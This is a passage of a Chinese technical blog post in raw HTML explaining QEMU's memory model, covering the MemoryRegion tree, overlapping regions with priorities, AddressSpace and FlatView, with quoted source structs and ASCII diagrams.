href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/exec/memory.h#L785"><strong>struct MemoryRegion</strong></a>，以树状组织管理整个gpa。</p><h2 id="struct-MemoryRegion"><a href="#struct-MemoryRegion" class="headerlink" title="struct MemoryRegion"></a>struct MemoryRegion</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MemoryRegion:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A struct representing a memory region.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegion</span> &#123;</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The following fields should fit in a cache line */</span></span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> ram;</span><br><span class="line">    <span class="type">bool</span> subpage;</span><br><span class="line">    <span class="type">bool</span> readonly; <span class="comment">/* For RAM regions */</span></span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> rom_device;</span><br><span class="line">    <span class="type">bool</span> flush_coalesced_mmio;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> is_iommu;</span><br><span class="line">    RAMBlock *ram_block;</span><br><span class="line">    Object *owner;</span><br><span class="line">    <span class="comment">/* owner as TYPE_DEVICE. Used for re-entrancy checks in MR access hotpath */</span></span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> MemoryRegionOps *ops;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    MemoryRegion *container;</span><br><span class="line">    <span class="type">int</span> mapped_via_alias; <span class="comment">/* Mapped via an alias, container might be NULL */</span></span><br><span class="line">    Int128 size;</span><br><span class="line">    hwaddr addr;</span><br><span class="line">    <span class="type">void</span> (*destructor)(MemoryRegion *mr);</span><br><span class="line">    <span class="type">uint64_t</span> align;</span><br><span class="line">    <span class="type">bool</span> terminates;</span><br><span class="line">    <span class="type">bool</span> ram_device;</span><br><span class="line">    <span class="type">bool</span> enabled;</span><br><span class="line">    <span class="type">bool</span> warning_printed; <span class="comment">/* For reservations */</span></span><br><span class="line">    <span class="type">uint8_t</span> vga_logging_count;</span><br><span class="line">    MemoryRegion *alias;</span><br><span class="line">    hwaddr alias_offset;</span><br><span class="line">    <span class="type">int32_t</span> priority;</span><br><span class="line">    QTAILQ_HEAD(, MemoryRegion) subregions;</span><br><span class="line">    QTAILQ_ENTRY(MemoryRegion) subregions_link;</span><br><span class="line">    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">unsigned</span> ioeventfd_nb;</span><br><span class="line">    MemoryRegionIoeventfd *ioeventfds;</span><br><span class="line">    RamDiscardManager *rdm; <span class="comment">/* Only for RAM */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* For devices designed to perform re-entrant IO into their own IO MRs */</span></span><br><span class="line">    <span class="type">bool</span> disable_reentrancy_guard;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其<strong>addr</strong>字段表明<strong>MemoryRegion</strong>起始gpa相对于<strong>父MemoryRegion</strong>起始gpa的相对偏移，而<strong>size</strong>表明这段内存区间的大小。</p><p>实际上，根据<a href="https://www.qemu.org/docs/master/devel/memory.html#types-of-regions">Qemu官网</a>，<strong>MemoryRegion</strong>可以分为<strong>RAM MemoryRegion</strong>、<strong>ROM MemoryRegion</strong>、<strong>MMIO MemoryRegion</strong>、<strong>ROM device MemoryRegion</strong>、<strong>IOMMU MemoryRegion</strong>、<strong>container MemoryRegion</strong>、<strong>alias MemoryRegion</strong>和<strong>reservation MemoryRegion</strong>。</p><h2 id="MR间关系"><a href="#MR间关系" class="headerlink" title="MR间关系"></a>MR间关系</h2><h3 id="树状结构"><a href="#树状结构" class="headerlink" title="树状结构"></a>树状结构</h3><p>对于<strong>container MemoryRegion</strong>来说，其<strong>subregions</strong>字段包含了其他的<strong>子MemoryRegion</strong>，而这些<strong>子MemoryRegion</strong>的<strong>container</strong>字段则指向该<strong>container MemoryRegion</strong>。这些<strong>子MemoryRegion</strong>之间没有交集，通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L2664"><strong>memory_region_add_subregion()</strong></a>初始化对应的<strong>subregions</strong>和<strong>container</strong>字段，从而构建出如下的树状结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">                              struct MemoryRegion                                      </span><br><span class="line">                             ┌──────────┬────────┐                                     </span><br><span class="line">                             │name      │io      │                                     </span><br><span class="line">                             ├──────────┼────────┤                                     </span><br><span class="line">                             │addr      │0       │                                     </span><br><span class="line">                             ├──────────┼────────┤                                     </span><br><span class="line">                             │size      │65536   │                                     </span><br><span class="line">                             ├──────────┼────────┤                                     </span><br><span class="line">                             │subregions│        │                                     </span><br><span class="line">                             └──────────┴───┬────┘                                     </span><br><span class="line">                                            │                                          </span><br><span class="line">                          ┌─────────────────┴─────────────────┬────────────────────┬───</span><br><span class="line">                          │                                   │                    │   </span><br><span class="line">                          ▼                                   ▼                    ▼   </span><br><span class="line">                struct MemoryRegion                 struct MemoryRegion                </span><br><span class="line">               ┌──────────┬──────────┐             ┌──────────┬──────────┐             </span><br><span class="line">               │name      │piix4-pm  │             │name      │pm-smbus  │             </span><br><span class="line">               ├──────────┼──────────┤             ├──────────┼──────────┤             </span><br><span class="line">               │addr      │1536      │             │addr      │45312     │             </span><br><span class="line">               ├──────────┼──────────┤             ├──────────┼──────────┤             </span><br><span class="line">               │size      │64        │             │size      │64        │             </span><br><span class="line">               ├──────────┼──────────┤             ├──────────┼──────────┤             </span><br><span class="line">               │subregions│          │             │subregions│NULL      │             </span><br><span class="line">               └──────────┴─────┬────┘             └──────────┴──────────┘             </span><br><span class="line">                                │                                                      </span><br><span class="line">             ┌──────────────────┴──────────┬──────────────────┬───                     </span><br><span class="line">             │                             │                  │                        </span><br><span class="line">             ▼                             ▼                  ▼                        </span><br><span class="line"> struct MemoryRegion            struct MemoryRegion                                    </span><br><span class="line">┌──────────┬──────────┐        ┌──────────┬──────────┐                                 </span><br><span class="line">│name      │acpi-cnt  │        │name      │acpi-evt  │                                 </span><br><span class="line">├──────────┼──────────┤        ├──────────┼──────────┤                                 </span><br><span class="line">│addr      │4         │        │addr      │0         │                                 </span><br><span class="line">├──────────┼──────────┤        ├──────────┼──────────┤                                 </span><br><span class="line">│size      │2         │        │size      │4         │                                 </span><br><span class="line">├──────────┼──────────┤        ├──────────┼──────────┤                                 </span><br><span class="line">│subregions│NULL      │        │subregions│NULL      │                                 </span><br><span class="line">└──────────┴──────────┘        └──────────┴──────────┘                                 </span><br></pre></td></tr></table></figure><h3 id="交叠"><a href="#交叠" class="headerlink" title="交叠"></a>交叠</h3><p>通常情况下，MemoryRegion之间不会交叠：要么内含；要么不相交。</p><p>但是考虑到诸如pcie设备的地址空间是动态分配的，因此允许MemoryRegion交叠并通过优先级决定交叠部分的可见性会极大地简化这部分代码。可以通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L2672"><strong>memory_region_add_subregion_overlap()</strong></a>来向一个<strong>container MemoryRegion</strong>中插入和其他<strong>子MemoryRegion</strong>交叠的MemoryRegion并声明优先级，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">           struct MemoryRegion                                                  </span><br><span class="line">          ┌──────────┬───────────────────┐                                      </span><br><span class="line">          │name      │system             │                                      </span><br><span class="line">          ├──────────┼───────────────────┤                                      </span><br><span class="line">          │addr      │0                  │                                      </span><br><span class="line">          ├──────────┼───────────────────┤                                      </span><br><span class="line">          │size      │0x10000000000000000│                                      </span><br><span class="line">          ├──────────┼───────────────────┤                                      </span><br><span class="line">          │priority  │0                  │                                      </span><br><span class="line">          ├──────────┼───────────────────┤                                      </span><br><span class="line">          │subregions│                   │                                      </span><br><span class="line">          └──────────┴───┬───────────────┘                                      </span><br><span class="line">                         │                                                      </span><br><span class="line">            ┌────────────┴────────────┬────────────────────────────►            </span><br><span class="line">            │                         │                                         </span><br><span class="line">            ▼                         ▼                                         </span><br><span class="line"> struct MemoryRegion      struct MemoryRegion                                   </span><br><span class="line">┌──────────┬──────────┐  ┌──────────┬───────────────────┐                       </span><br><span class="line">│name      │kvm-ioapic│  │name      │pci                │                       </span><br><span class="line">├──────────┼──────────┤  ├──────────┼───────────────────┤                       </span><br><span class="line">│addr      │0xfec00000│  │addr      │0                  │                       </span><br><span class="line">├──────────┼──────────┤  ├──────────┼───────────────────┤                       </span><br><span class="line">│size      │0x10000   │  │size      │0x10000000000000000│                       </span><br><span class="line">├──────────┼──────────┤  ├──────────┼───────────────────┤                       </span><br><span class="line">│priority  │0         │  │priority  │-1                 │                       </span><br><span class="line">├──────────┼──────────┤  ├──────────┼───────────────────┤                       </span><br><span class="line">│subregions│NULL      │  │subregions│                   │                       </span><br><span class="line">└──────────┴──────────┘  └──────────┴───┬───────────────┘                       </span><br><span class="line">                                        │                                       </span><br><span class="line">                                  ┌─────┴─────────────────────────────────────► </span><br><span class="line">                                  ▼                                             </span><br><span class="line">                         struct MemoryRegion                                    </span><br><span class="line">                        ┌──────────┬──────────┐                                 </span><br><span class="line">                        │name      │vga-lowmem│                                 </span><br><span class="line">                        ├──────────┼──────────┤                                 </span><br><span class="line">                        │addr      │0xa0000   │                                 </span><br><span class="line">                        ├──────────┼──────────┤                                 </span><br><span class="line">                        │size      │0x20000   │                                 </span><br><span class="line">                        ├──────────┼──────────┤                                 </span><br><span class="line">                        │priority  │1         │                                 </span><br><span class="line">                        ├──────────┼──────────┤                                 </span><br><span class="line">                        │subregions│NULL      │                                 </span><br><span class="line">                        └──────────┴──────────┘                                 </span><br></pre></td></tr></table></figure><p>如图所示，<strong>kvm-ioapic</strong>和<strong>pci</strong>相交叠，但由于<strong>kvm-ioapic</strong>优先级更高，所以在<strong>system</strong>所代表的地址空间中[0xfec00000, 0xfec10000)是<strong>kvm-ioapic</strong>的<strong>MemoryRegion</strong>而非<strong>pci</strong>下的<strong>MemoryRegion</strong>。</p><h1 id="AddressSpace"><a href="#AddressSpace" class="headerlink" title="AddressSpace"></a>AddressSpace</h1><p>对于Guest来说，相同的地址可能有不同的意义。例如port IO中的地址和内存中的地址，即使值相同表示的也不是同一个东西。</p><p>为此，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/exec/memory.h#L1112"><strong>struct AddressSpace</strong></a>来管理不同类型的地址空间，主要包括<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L94"><strong>address_space_memory</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L93"><strong>address_space_io</strong></a>。</p><h2 id="struct-AddressSpace"><a href="#struct-AddressSpace" class="headerlink" title="struct AddressSpace"></a>struct AddressSpace</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct AddressSpace: describes a mapping of addresses to #MemoryRegion objects</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddressSpace</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    MemoryRegion *root;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Accessed via RCU.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> *<span class="title">current_map</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ioeventfd_nb;</span><br><span class="line">    <span class="type">int</span> ioeventfd_notifiers;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionIoeventfd</span> *<span class="title">ioeventfds</span>;</span></span><br><span class="line">    QTAILQ_HEAD(, MemoryListener) listeners;</span><br><span class="line">    QTAILQ_ENTRY(AddressSpace) address_spaces_link;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，<strong>root</strong>字段指向该地址空间中的<strong>MemoryRegion</strong>资源，即树状<strong>MemoryRegion</strong>的根，从而可通过遍历树状<strong>MemoryRegion</strong>来访问地址空间中的所有地址。</p><h2 id="FlatView"><a href="#FlatView" class="headerlink" title="FlatView"></a>FlatView</h2><p>Qemu处理Guest的内存操作时，都是基于对应<strong>AddressSpace</strong>，找到地址对应的<strong>MemoryRegion</strong>，完成最终的内存操作模拟。但考虑到<strong>MemoryRegion</strong>的树状结构，需要进行大量的计算才能获取地址实际对应的<strong>MemoryRegion</strong>。为了提高效率，Qemu在<strong>AddressSpace</strong>中添加了<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/exec/memory.h#L1134"><strong>FlatView</strong></a>来加快地址查找，其结构如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Flattened global view of current active memory hierarchy.  Kept in sorted</span></span><br><span class="line"><span class="comment"> * order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatView</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> ref;</span><br><span class="line">    FlatRange *ranges;</span><br><span class="line">    <span class="type">unsigned</span> nr;</span><br><span class="line">    <span class="type">unsigned</span> nr_allocated;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">AddressSpaceDispatch</span> *<span class="title">dispatch</span>;</span></span><br><span class="line">    MemoryRegion *root;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Range of memory in the global map.  Addresses are absolute. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FlatRange</span> &#123;</span></span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    hwaddr offset_in_region;</span><br><span class="line">    AddrRange addr;</span><br><span class="line">    <span class="type">uint8_t</span> dirty_log_mask;</span><br><span class="line">    <span class="type">bool</span> romd_mode;</span><br><span class="line">    <span class="type">bool</span> readonly;</span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>具体来说，<strong>FlatView</strong>由数个互相不重合的<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L219"><strong>struct FlatRange</strong></a>构成，每一个<strong>FlatRange</strong>包含地址空间和其实际对应的<strong>MemoryRegion</strong>，从而能表示<strong>AddressSpace</strong>中树状<strong>MemoryRegion</strong>经过平坦化后的最终线性地址空间，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">                                                                                           ┌─────────────────────────────────────────┐                               </span><br><span class="line">                                                                                           │                                         │                               </span><br><span class="line">                                                                                           │                                         │                               </span><br><span class="line">                                                                                           │                          ┌──────────────▼─────────────┐                 </span><br><span class="line">                                                                                           │                          │      struct FlatRange      │                 </span><br><span class="line">                                                                                           │                          │ ┌──────┬─────────────────┐ │                 </span><br><span class="line">                                                                                           │                          │ │start │0                │ │                 </span><br><span class="line">                                                                                           │                          │ ├──────┼─────────────────┤ │                 </span><br><span class="line">                                     struct AddressSpace                                   │                          │ │size  │1536             │ │                 </span><br><span class="line">                                     ┌───────────┬────┐        ┌────►struct FlatView       │                          │ ├──────┼─────────────────┤ │                 </span><br><span class="line">                                     │name       │I/O │        │      ┌──────┬─────┐       │            ┌─────────────┼─┤mr    │                 │ │                 </span><br><span class="line">                                     ├───────────┼────┤        │      │ranges│     ├───────┘            │             │ └──────┴─────────────────┘ │                 </span><br><span class="line">                                     │current_map│    ├────────┘      └──────┴─────┘                    │             │                            │                 </span><br><span class="line">                                     ├───────────┼────┤                                                 │             ├────────────────────────────┤                 </span><br><span class="line">                                     │root       │    │                                                 │             │      struct FlatRange      │                 </span><br><span class="line">                                     └───────────┴─┬──┘                                                 │             │ ┌──────┬─────────────────┐ │                 </span><br><span class="line">                                                   │                                                    │             │ │start │1536             │ │                 </span><br><span class="line">                                                   │                                                    │             │ ├──────┼─────────────────┤ │                 </span><br><span class="line">                                                   ▼                                                    │             │ │size  │4                │ │                 </span><br><span class="line">                                     struct MemoryRegion◄───────────────────────────────────────────────┤             │ ├──────┼─────────────────┤ │                 </span><br><span class="line">                                    ┌──────────┬────────┐                                               │             │ │mr    │                 ├─┼──────────────┐  </span><br><span class="line">                                    │name      │io      │                                               │             │ └──────┴─────────────────┘ │              │  </span><br><span class="line">                                    ├──────────┼────────┤                                               │             │                            │              │  </span><br><span class="line">                                    │addr      │0       │                                               │             ├────────────────────────────┤              │  </span><br><span class="line">                                    ├──────────┼────────┤                                               │             │      struct FlatRange      │              │  </span><br><span class="line">                                    │size      │65536   │                                               │             │ ┌──────┬─────────────────┐ │              │  </span><br><span class="line">                                    ├──────────┼────────┤                                               │             │ │start │1540             │ │              │  </span><br><span class="line">                                    │subregions│        │                                               │             │ ├──────┼─────────────────┤ │              │  </span><br><span class="line">                                    └──────────┴───┬────┘                                               │             │ │size  │2                │ │              │  </span><br><span class="line">                                                   │                                                    │             │ ├──────┼─────────────────┤ │              │  </span><br><span class="line">                                 ┌─────────────────┴─────────────────┬                                  │             │ │mr    │                 ├─┼──────────┐   │  </span><br><span class="line">                                 │                                   │                                  │             │ └──────┴─────────────────┘ │          │   │  </span><br><span class="line">                                 ▼                                   ▼                                  │             │                            │          │   │  </span><br><span class="line">┌─────────────────────►struct MemoryRegion                 struct MemoryRegion◄─────┐                   │             ├────────────────────────────┤          │   │  </span><br><span class="line">│                     ┌──────────┬──────────┐             ┌──────────┬──────────┐   │                   │             │      struct FlatRange      │          │   │  </span><br><span class="line">│                     │name      │piix4-pm  │             │name      │pm-smbus  │   │                   │             │ ┌──────┬─────────────────┐ │          │   │  </span><br><span class="line">│                     ├──────────┼──────────┤             ├──────────┼──────────┤   │                   │             │ │start │1542             │ │          │   │  </span><br><span class="line">│                     │addr      │1536      │             │addr      │45312     │   │                   │             │ ├──────┼─────────────────┤ │          │   │  </span><br><span class="line">│                     ├──────────┼──────────┤             ├──────────┼──────────┤   │                   │             │ │size  │58               │ │          │   │  </span><br><span class="line">│                     │size      │64        │             │size      │64        │   │                   │             │ ├──────┼─────────────────┤ │          │   │  </span><br><span class="line">│                     ├──────────┼──────────┤             ├──────────┼──────────┤   │                   │             │ │mr    │                 ├─┼──────┐   │   │  </span><br><span class="line">│                     │subregions│          │             │subregions│NULL      │   │                   │             │ └──────┴─────────────────┘ │      │   │   │  </span><br><span class="line">│                     └──────────┴─────┬────┘             └──────────┴──────────┘   │                   │             │                            │      │   │   │  </span><br><span class="line">│                                      │                                            │                   │             ├────────────────────────────┤      │   │   │  </span><br><span class="line">│                   ┌──────────────────┴──────────┬                                 │                   │             │      struct FlatRange      │      │   │   │  </span><br><span class="line">│                   │                             │                                 │                   │             │ ┌──────┬─────────────────┐ │      │   │   │  </span><br><span class="line">│                   ▼                             ▼                                 │                   │             │ │start │1600             │ │      │   │   │  </span><br><span class="line">│   ┌──►struct MemoryRegion            struct MemoryRegion◄──────┐                  │                   │             │ ├──────┼─────────────────┤ │      │   │   │  </span><br><span class="line">│   │  ┌──────────┬──────────┐        ┌──────────┬──────────┐    │                  │                   │             │ │size  │43712            │ │      │   │   │  </span><br><span class="line">│   │  │name      │acpi-cnt  │        │name      │acpi-evt  │    │                  │                   │             │ ├──────┼─────────────────┤ │      │   │   │  </span><br><span class="line">│   │  ├──────────┼──────────┤        ├──────────┼──────────┤    │                  │                   ├─────────────┼─┤mr    │                 │ │      │   │   │  </span><br><span class="line">│   │  │addr      │4         │        │addr      │0         │    │                  │                   │             │ └──────┴─────────────────┘ │      │   │   │  </span><br><span class="line">│   │  ├──────────┼──────────┤        ├──────────┼──────────┤    │                  │                   │             │                            │      │   │   │  </span><br><span class="line">│   │  │size      │2         │        │size      │4         │    │                  │                   │             ├────────────────────────────┤      │   │   │  </span><br><span class="line">│   │  ├──────────┼──────────┤        ├──────────┼──────────┤    │                  │                   │             │      struct FlatRange      │      │   │   │  </span><br><span class="line">│   │  │subregions│NULL      │        │subregions│NULL      │    │                  │                   │             │ ┌──────┬─────────────────┐ │      │   │   │  </span><br><span class="line">│   │  └──────────┴──────────┘        └──────────┴──────────┘    │                  │                   │             │ │start │45312            │ │      │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ ├──────┼─────────────────┤ │      │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ │size  │64               │ │      │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ ├──────┼─────────────────┤ │      │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ │mr    │                 ├─┼───┐  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ └──────┴─────────────────┘ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │                            │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             ├────────────────────────────┤   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │      struct FlatRange      │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ ┌──────┬─────────────────┐ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ │start │45376            │ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ ├──────┼─────────────────┤ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ │size  │20160            │ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   │             │ ├──────┼─────────────────┤ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                   └─────────────┼─┤mr    │                 │ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                                 │ └──────┴─────────────────┘ │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                                 │                            │   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                                 └────────────────────────────┘   │  │   │   │  </span><br><span class="line">│   │                                                            │                  │                                                                  │  │   │   │  </span><br><span class="line">│   │                                                            │                  └──────────────────────────────────────────────────────────────────┘  │   │   │  </span><br><span class="line">│   │                                                            │                                                                                        │   │   │  </span><br><span class="line">└───┼────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────────────────────────────┘   │   │  </span><br><span class="line">    │                                                            │                                                                                            │   │  </span><br><span class="line">    └────────────────────────────────────────────────────────────┼────────────────────────────────────────────────────────────────────────────────────────────┘   │  </span><br><span class="line">                                                                 │                                                                                                │  </span><br><span class="line">                                                                 └────────────────────────────────────────────────────────────────────────────────────────────────┘  </span><br></pre></td></tr></table></figure><p>而Qemu通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L1100"><strong>address_space_update_topology()</strong></a>生成<strong>AddressSpace</strong>对应的<strong>FlatView</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 